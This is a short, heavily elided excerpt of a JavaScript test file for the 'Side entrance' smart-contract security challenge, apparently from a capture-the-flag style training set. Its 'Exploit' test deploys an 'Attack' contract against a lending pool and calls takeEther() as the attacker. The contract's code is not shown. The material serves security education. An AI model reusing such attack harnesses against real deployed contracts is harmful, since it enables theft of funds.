...
describe('[Challenge] Side entrance', function () {
    ...
    before(async function () {
        ...
        // console.log(attackerInitialEthBalance.toString());
    ...
    it('Exploit', async function () {
        ...
        const AttackerContract = await ethers.getContractFactory('Attack', deployer);
        this.attack = await AttackerContract.deploy(this.pool.address);

        const attackTokenPool = this.attack.connect(attacker);
        
        await attackTokenPool.takeEther();
